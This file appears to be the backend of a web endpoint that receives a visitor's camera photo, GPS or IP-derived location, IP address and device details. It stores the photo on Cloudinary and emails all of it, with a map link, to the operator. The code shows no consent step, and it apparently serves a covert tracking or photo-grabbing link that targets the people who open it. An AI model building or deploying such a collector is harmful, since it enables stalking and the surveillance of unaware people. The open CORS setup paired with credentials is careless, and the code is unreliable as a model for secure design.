import cloudinary from "cloudinary";
import nodemailer from "nodemailer";
import fetch from "node-fetch";

export const config = {
  api: {
    bodyParser: { sizeLimit: "15mb" }
  }
};

cloudinary.v2.config({
  cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
  api_key: process.env.CLOUDINARY_API_KEY,
  api_secret: process.env.CLOUDINARY_API_SECRET
});

function getIp(req) {
  let ip =
    req.headers["x-forwarded-for"] ||
    req.headers["x-real-ip"] ||
    req.socket?.remoteAddress ||
    null;

  if (!ip) return null;
  if (ip.includes(",")) ip = ip.split(",")[0];
  return ip.replace("::ffff:", "");
}

async function ipLookup(ip) {
  try {
    if (!ip) return null;

    const res = await fetch(`https://ipapi.co/${ip}/json/`);
    if (!res.ok) return null;

    const j = await res.json();
    if (j.latitude && j.longitude) {
      return `${j.latitude},${j.longitude}`;
    }
    return null;
  } catch (e) {
    return null;
  }
}

export default async function handler(req, res) {
  // FULL CORS FIX
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Credentials", "true");
  res.setHeader("Access-Control-Allow-Methods", "GET,POST,OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");

  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  if (req.method !== "POST") {
    return res.status(405).json({ error: "Only POST allowed" });
  }

  try {
    const body = req.body || {};

    const {
      image,
      dateTime,
      deviceModel,
      browser,
      resolution,
      gpsLocation
    } = body;

    const ip = getIp(req);

    // Backend IP Geo
    let finalLocation = null;
    let locationType = null;

    if (gpsLocation) {
      locationType = "Google Location";
      finalLocation = gpsLocation;
    } else {
      const ipLoc = await ipLookup(ip);
      if (ipLoc) {
        locationType = "IP Based Location";
        finalLocation = ipLoc;
      }
    }

    const finalImage =
      image && typeof image === "string"
        ? image
        : "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR4nGNgYAAAAAMAASsJTYQAAAAASUVORK5CYII=";

    const uploadRes = await cloudinary.v2.uploader.upload(finalImage, {
      folder: "user_photos"
    });

    const photoURL = uploadRes.secure_url;

    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.GMAIL_USER,
        pass: process.env.GMAIL_PASS
      }
    });

    const html = `
      <h2>New Photo Uploaded</h2>

      <p>Date & Time: ${dateTime}</p>
      <p>Device Model: ${deviceModel}</p>
      <p>Browser: ${browser}</p>
      <p>IP Address: ${ip}</p>
      <p>Photo Resolution: ${resolution}</p>

      <p>${locationType}: 
        <a target="_blank" href="https://www.google.com/maps?q=${finalLocation}">
          https://www.google.com/maps?q=${finalLocation}
        </a>
      </p>

      <a href="${photoURL}" 
         style="padding:10px 14px;background:#007bff;color:#fff;border-radius:6px;text-decoration:none;">
        View Uploaded Photo
      </a>
    `;

    await transporter.sendMail({
      from: process.env.GMAIL_USER,
      to: process.env.GMAIL_USER,
      subject: "New Photo Uploaded",
      html
    });

    return res.status(200).json({ success: true, url: photoURL });
  } catch (e) {
    console.error("ERROR:", e);
    return res.status(500).json({ error: e.message });
  }
}
